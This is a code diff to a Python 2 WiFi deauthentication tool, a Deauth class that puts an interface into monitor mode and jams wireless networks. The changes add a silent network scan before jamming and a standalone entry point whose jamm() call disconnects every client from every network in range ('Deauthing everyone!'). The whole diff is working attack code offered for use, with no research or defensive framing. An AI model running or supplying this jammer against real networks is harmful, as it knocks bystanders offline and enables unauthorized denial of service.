@@ -16,6 +16,7 @@ class Deauth:
         self.iface = iface
         self.processes = {}
         self.clients = []
+        self.silent = False
         if os.system("iwconfig " + self.iface + "| grep Monitor >/dev/null 2>&1") != 0:
             try:
                 self.iface = switch_to_monitor(iface)
@@ -47,7 +48,8 @@ class Deauth:
                 crypto.add("WEP")
             else:
                 crypto.add("OPN")
-        print "AP: %r [%s], channed %d, %s" % (ssid, bssid, channel,' / '.join(crypto))
+        if not self.silent:
+            print "AP: %r [%s], channed %d, %s" % (ssid, bssid, channel,' / '.join(crypto))
         self.networks[bssid] = (ssid, channel, crypto)
 
     def __channel_hopper(self):
@@ -98,14 +100,20 @@ class Deauth:
         self.processes[str(proc.pid)] = str(bssid) + " " + str(client)
 
     def jamm(self, count = -1, client = 'FF:FF:FF:FF:FF:FF'):
+        if len(self.networks) == 0:
+            self.silent = True
+            self.show_networks()
+            self.silent = False
         if client == 'FF:FF:FF:FF:FF:FF':
             print "[*] Deauthing everyone!"
         else:
             print "[*] Deauthing " + client + " from every wifi in the area"
+        time.sleep(1)
         for x in range(len(self.networks)):
             proc = Process(target = self.__deauth, args = (self.networks.items()[x][0],client,count,))
             proc.start()
             self.processes[str(proc.pid)] = str(self.networks.items()[x][0]) + " " + str(client)
+
     def stop_deauth(self, all = False):
         if len(self.processes) == 0:
             print "Nothing is running :/"
@@ -134,3 +142,10 @@ class Deauth:
 ###################################################################################################
 #                init with deauth = Deauth(iface = "the wireless iface")                          #
 ###################################################################################################
+
+
+
+if __name__ == "__main__":                      # you can run me with python modules/deauth.py
+    iface = raw_input("Enter a wireless iface: ")
+    deauth = Deauth(iface)
+    deauth.jamm()
